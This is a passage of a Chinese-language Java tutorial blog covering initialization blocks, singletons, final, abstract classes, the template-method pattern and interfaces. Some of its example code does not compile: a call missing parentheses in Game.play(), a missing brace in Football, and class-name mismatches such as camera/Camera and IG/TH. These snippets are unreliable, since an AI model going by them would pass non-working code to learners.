class="comment">//代码</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>修饰符可选，要写的话也只能写 static</li><li>代码块分为两类，使用 static 修饰的交静态代码块，没有 static 修饰的交普通代码块</li><li>逻辑语句可分为任何逻辑语句（输入输出、方法调用、循环、判断等）</li><li>分号可以省略</li></ul><h2 id="代码块的好处"><a class="markdownIt-Anchor" href="#代码块的好处">#</a> 代码块的好处</h2><ul><li>相当于另外一种形式的构造器（对构造器的补充机制），可以做初始化的操作</li><li>如果多个构造器中都有重复的语句，可以抽取到初始化块中，提高代码的复用性</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Movie</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="keyword">private</span> String director;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> year;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 这里有三种构造器，而我们在构造器前添加了普通代码块，注意是普通代码块</span></span><br><span class="line"><span class="comment">     * 那么无论是哪个构造器被调用，都会先执行代码块中的内容，这样就提升了代码的复用性</span></span><br><span class="line"><span class="comment">     * 就不需要再每个构造器中都写上这三句代码</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;映前广告&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;广告结束&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;电影开始&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Movie</span><span class="params">(String title)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.title = title;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Movie</span><span class="params">(String title, String director)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.title = title;</span><br><span class="line">        <span class="built_in">this</span>.director = director;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Movie</span><span class="params">(String title, <span class="type">int</span> year, String director)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.title = title;</span><br><span class="line">        <span class="built_in">this</span>.year = year;</span><br><span class="line">        <span class="built_in">this</span>.director = director;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="细节-5"><a class="markdownIt-Anchor" href="#细节-5">#</a> 细节</h2><ul><li>static 代码块的作用是对类进行初始化，而且随着<strong>类的加载</strong>而执行，并且只会执行一次。如果是普通代码块，每创建一个对象，就执行一次</li></ul><p>类什么时候被加载：</p><ol><li>创建实例时（new）</li><li>创建子类对象实例，父类也会被加载，父类先加载，子类后加载</li><li>使用类的静态成员时（静态变量 / 方法）</li></ol><ul><li><p>普通代码块在创建对象实例时会被隐式的调用，被创建一次就会被调用一次。但如果只是使用类的静态成员，普通代码块不会执行</p></li><li><p>创建对象时，代码块在类中的调用顺序如下 1-&gt;2-&gt;3</p><ol><li>调用静态代码块和静态属性初始化（静态代码块和静态属性初始化调用的优先级一样，如果有多个静态代码块和多个静态变量初始化，则按他们定义的顺序调用）</li><li>调用普通代码块和普通属性的初始化（普通代码块和普通属性初始化调用的优先级一样，如果有多个普通代码块和普通属性初始化，则按定义顺序调用）</li><li>调用构造方法</li></ol></li><li><p>构造器的最前面其实隐含了 super () 和调用普通代码块的一句话，静态相关的代码块，属性初始化，在类加载时就执行完毕，因此是优先于构造器和普通代码块执行的</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">A</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//隐藏语句：</span></span><br><span class="line"><span class="comment">//(1)super();</span></span><br><span class="line">        <span class="comment">//(2)调用普通代码块的语句</span></span><br><span class="line">        System.out.println(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>创建一个子类对象时的加载顺序：（面试高频）<ol><li>父类的静态代码块和静态属性</li><li>子类的静态代码块和静态属性</li><li>父类的普通代码块和普通属性初始化</li><li>父类的构造方法</li><li>子类的普通代码块和普通属性初始化</li><li>子类的构造方法</li></ol></li></ul><h1 id="单例设计模式"><a class="markdownIt-Anchor" href="#单例设计模式">#</a> 单例设计模式</h1><p>单例设计模式，就是采取一定的方法保证在整个的软件系统中，对某个类只能存在一个对象实例，并且该类只提供一个取得其对象实例的方法。单例模式有两种方式：饿汉式和懒汉式</p><h2 id="饿汉式"><a class="markdownIt-Anchor" href="#饿汉式">#</a> 饿汉式</h2><p>无论是否使用对象，都会先创建，所以叫饿汉式。但这样有可能会造成资源浪费</p><p>步骤如下</p><ol><li>构造器私有化（防止直接 new</li><li>类的内部创建对象</li><li>向外暴露一个静态的公共方法    getInstance</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SingleTon</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">GirlFriend</span> <span class="variable">girlFriend</span> <span class="operator">=</span> GirlFriend.getGirlFriend();</span><br><span class="line">        System.out.println(girlFriend);<span class="comment">//无论创建几次新的对象，都是指向GirlFriend内部创建的对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GirlFriend</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="comment">//为了能够在静态方法中使用，需要将其静态化</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">GirlFriend</span> <span class="variable">gf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GirlFriend</span>(<span class="string">&quot;xiaohong&quot;</span>);</span><br><span class="line">    <span class="comment">//如何保证只能创建一个GirlFriend对象</span></span><br><span class="line">    <span class="comment">//1.将构造器私有化</span></span><br><span class="line">    <span class="comment">//2.在类的内部直接创建</span></span><br><span class="line">    <span class="comment">//3.提供一个公共的static方法，返回gf对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">GirlFriend</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> GirlFriend <span class="title function_">getGirlFriend</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> gf;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;GirlFriend&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="懒汉式"><a class="markdownIt-Anchor" href="#懒汉式">#</a> 懒汉式</h2><p>在需要使用的时候才创建对象，所以叫懒汉式</p><p>步骤如下：</p><ol><li>构造器私有化</li><li>定义一个 static 对象</li><li>提供一个 public 方法，可以返回 Cat 对象</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SingleTon2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Cat</span> <span class="variable">mao</span> <span class="operator">=</span> Cat.getInstance();</span><br><span class="line">        System.out.println(mao);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//希望在程序运行过程中只能创建一个Cat对象</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Cat cat;</span><br><span class="line">    <span class="comment">//1.构造器私有化</span></span><br><span class="line">    <span class="comment">//2.定义一个static对象</span></span><br><span class="line">    <span class="comment">//3.提供一个public方法，可以返回Cat对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Cat</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Cat <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (cat == <span class="literal">null</span>) &#123;<span class="comment">//如果没有创建Cat对象</span></span><br><span class="line">            cat = <span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&quot;mimi&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Cat&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="两者区别"><a class="markdownIt-Anchor" href="#两者区别">#</a> 两者区别</h2><ol><li>最主要的区别在于创建对象的时机不同，饿汉式是在类加载就创建了对象实例，而懒汉式是在使用是才创建</li><li>饿汉式不存在<strong>线程安全</strong>问题，懒汉式存在线程安全问题</li><li>饿汉式存在浪费资源的可能，懒汉式因为是使用时才创建，不存在这个问题</li><li>在 javaSE 标准类中，java.lang.Runtime 就是经典的单例模式</li></ol><h1 id="final关键字"><a class="markdownIt-Anchor" href="#final关键字">#</a> final 关键字</h1><p>final 可以修饰类、属性、方法和局部变量，在什么时候会用到 final 关键字</p><ol><li>当不希望类被继承时，可以用 final 修饰</li><li>当不希望父类的某个方法被子类覆盖 / 重写时</li><li>当不希望类的某个属性的值被修改</li><li>当不希望某个局部变量被修改</li></ol><h2 id="注意事项-3"><a class="markdownIt-Anchor" href="#注意事项-3">#</a> 注意事项</h2><ul><li>final 修饰的属性又叫常量，一般用 XX_XX_XX 来命名</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">double</span> <span class="variable">TAX_RATE</span> <span class="operator">=</span> <span class="number">0.08</span>;</span><br></pre></td></tr></table></figure><ul><li>final 修饰的属性在定义时，必须赋初值，并且以后不能再修改，赋值可以在以下位置之一<ol><li>定义时：如 public final double TAX_RATE = 0.08;</li><li>在构造器中</li><li>在代码块中</li></ol></li><li>如果 final 修饰的属性是静态的，则初始化的位置只能是：定义时；在静态代码块；不能在构造器中赋值</li><li>final 类不能继承，但可以实例化对象</li><li>如果类不是 final 类，但是含有 final 方法，则该方法虽然不能重写，但是可以被继承</li><li>一般来说，如果一个类已经是 final 类了，就没必要将方法再修饰成 final</li><li>final 不能修饰构造器</li><li>final 和 static 往往搭配使用，效率更高，底层编译器做了优化处理，不会导致类加载</li><li>包装类（integer，double，float，boolean 等都是 final），String 也是 final 类</li></ul><h1 id="抽象类"><a class="markdownIt-Anchor" href="#抽象类">#</a> 抽象类</h1><p>当父类的某些方法需要声明，但是又不确定如何实现时，可以将其声明为抽象方法，那么这个类就是抽象类</p><p>一般情况都是让子类继承来实现方法，抽象类的价值更多是在于设计，设计者设计好之后，让子类继承并实现抽象类。抽象类是考官比较爱问的知识点，在框架和设计模式使用较多</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//当一个类中存在抽象方法时，类也要声明为抽象类</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="细节-6"><a class="markdownIt-Anchor" href="#细节-6">#</a> 细节</h2><ol><li>抽象类不能被实例化</li><li>抽象类不一定要包含 abstract 方法，抽象类可以没 abstract 方法</li><li>一旦类包含了 abstract 方法，这个类就必须声明为抽象类</li><li>abstract 只能修饰类和方法，不能修饰属性或其他的</li><li>抽象类可以有任意成员，比如非抽象方法、构造器、静态属性等</li><li>抽象方法不能有主题，即不能实现</li><li>如果一个类继承了抽象类，则它必须实现抽象类的所有抽象方法，除非它自己也声明为抽象类</li><li>抽象方法不能使用 private、final 和 static 修饰，因为这些关键字和重写都是相违背的</li></ol><h1 id="抽象模板模式"><a class="markdownIt-Anchor" href="#抽象模板模式">#</a> 抽象模板模式</h1><p>在模板模式中，一个抽象类公开定义了执行它的方法的方式，它的子类可以按需要重写方法实现，但调用将以抽象类中定义的方式进行，这种类型的设计模式属于行为型模式。</p><h2 id="主要解决的问题"><a class="markdownIt-Anchor" href="#主要解决的问题">#</a> 主要解决的问题</h2><p>解决在多个子类中重复实现相同的方法的问题，通过将通用方法抽象到父类中来避免代码重复</p><p>** 使用建议：** 当有多个子类共有的方法且逻辑相同时，考虑使用模板方法定义在父类中；对于重要或复杂的方法，可以考虑作为模板方法定义在父类中</p><h2 id="优缺点"><a class="markdownIt-Anchor" href="#优缺点">#</a> 优缺点</h2><ul><li>** 封装不变部分：** 算法的不变部分被封装在父类中</li><li>** 扩展可变部分：** 子类可以扩展或修改算法的可变部分</li><li>** 提取公共代码：** 减少代码重复，便于维护</li></ul><p>缺点就是 ** 类数目增加：** 没个不同的实现都需要一个子类，可能倒是系统庞大</p><h2 id="实例"><a class="markdownIt-Anchor" href="#实例">#</a> 实例</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建一个抽象类，它的模板方法被设置为final</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Game</span> &#123;</span><br><span class="line">   <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">()</span>;</span><br><span class="line">   <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">startPlay</span><span class="params">()</span>;</span><br><span class="line">   <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">endPlay</span><span class="params">()</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">//模板</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">play</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="comment">//初始化游戏</span></span><br><span class="line">      initialize();</span><br><span class="line">      <span class="comment">//开始游戏</span></span><br><span class="line">      startPlay</span><br><span class="line">      <span class="comment">//结束游戏</span></span><br><span class="line">      endPlay();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建扩展了上述类的实体类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cricket</span> <span class="keyword">extends</span> <span class="title class_">Game</span> &#123;</span><br><span class="line"> </span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">endPlay</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Cricket Game Finished!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Cricket Game Initialized! Start playing.&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">startPlay</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Cricket Game Started. Enjoy the game!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Football</span> <span class="keyword">extends</span> <span class="title class_">Game</span> &#123;</span><br><span class="line"> </span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">endPlay</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Football Game Finished!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Football Game Initialized! Start playing.&quot;</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">startPlay</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Football Game Started. Enjoy the game!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="接口"><a class="markdownIt-Anchor" href="#接口">#</a> 接口</h1><p>接口就是给出一些没有实现的方法，到某个类要使用的时候，再根据具体情况把这些方法写出来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">interface 接口名&#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    <span class="comment">//方法（抽象方法/默认方法/静态方法）</span></span><br><span class="line">&#125;</span><br><span class="line">class 类名 implements 接口&#123;</span><br><span class="line">    自己属性；</span><br><span class="line">    自己方法</span><br><span class="line">必须实现的接口的抽象方法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>在 jdk7.0 前，接口里的所有方法都没有方法体</li><li>jdk8.0 后接口类可以有静态方法和默认方法 (static 和 default)，也就是说接口中可以有方法的具体实现</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 文件名 : Animal.java */</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">travel</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 文件名 : MammalInt.java */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MammalInt</span> <span class="keyword">implements</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Mammal eats&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">travel</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Mammal travels&quot;</span>);</span><br><span class="line">   &#125; </span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">noOfLegs</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">      <span class="type">MammalInt</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MammalInt</span>();</span><br><span class="line">      m.eat();</span><br><span class="line">      m.travel();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="细节-7"><a class="markdownIt-Anchor" href="#细节-7">#</a> 细节</h2><ol><li>接口不能被实例化</li><li>接口中所有的方法都是 public 方法，如果不写也是默认 public，接口中抽象方法可以不用 abstract 修饰</li><li>一个普通类实现接口，就必须将该接口的所有方法都实现（alt+enter 快捷键）</li><li>抽象类实现接口，可以不用实现接口的方法</li><li>一个类可以同时实现多个接口</li><li>接口中的属性只能是 final 类型，而且是 public static final 修饰符，但是被隐藏了，比如 int a=1; 实际上是 public static final int a=1;（必须初始化）</li><li>接口中书信固定访问形式：接口名。属性名</li><li>一个接口不能继承其他的类，但是可以继承多个别的接口：interface A extends B,C {}</li><li>接口的修饰符只能是 public 和默认，这点和类的修饰符是一样的</li></ol><h2 id="接口和继承的比较"><a class="markdownIt-Anchor" href="#接口和继承的比较">#</a> 接口和继承的比较</h2><p>当子类继承了父类，就自动拥有了父类的功能。如果子类需要扩展功能，可以通过实现接口的方式来扩展。</p><p>可以理解为，实现接口是对 java 单继承机制的一种补充。</p><ul><li><p>继承的作用主要在于：解决代码的复用性和可维护性</p></li><li><p>而接口的作用在于：设计。设计好各种规范，让类来实现这些方法</p></li><li><p>接口比继承更加灵活，继承是满足 is - a 的关系，而接口秩序满足 like - a 的关系</p></li><li><p>接口在一定程度上实现代码解耦</p></li></ul><h2 id="接口的多态"><a class="markdownIt-Anchor" href="#接口的多态">#</a> 接口的多态</h2><ul><li>多态参数</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//实现了这个接口的类的对象，都可以作为形参传递</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">work</span><span class="params">(UsbInterface a)</span> &#123;<span class="comment">//这里a就是接口类型的类的对象实例</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>多态数组</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AAA</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Usb[] usb = <span class="keyword">new</span> <span class="title class_">Usb</span>[<span class="number">2</span>];</span><br><span class="line">        usb[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">Phone</span>();</span><br><span class="line">        usb[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">Camera</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Usb</span>&#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Phone</span> <span class="keyword">implements</span> <span class="title class_">Usb</span>&#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">camera</span> <span class="keyword">implements</span> <span class="title class_">Usb</span>&#123;&#125;</span><br></pre></td></tr></table></figure><ul><li>接口存在多态传递现象</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AA</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">IG</span> <span class="variable">ig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Teacher</span>();</span><br><span class="line">        <span class="type">TH</span> <span class="variable">ih</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Teacher</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IH</span> &#123;&#125;</span><br><span class="line"><span 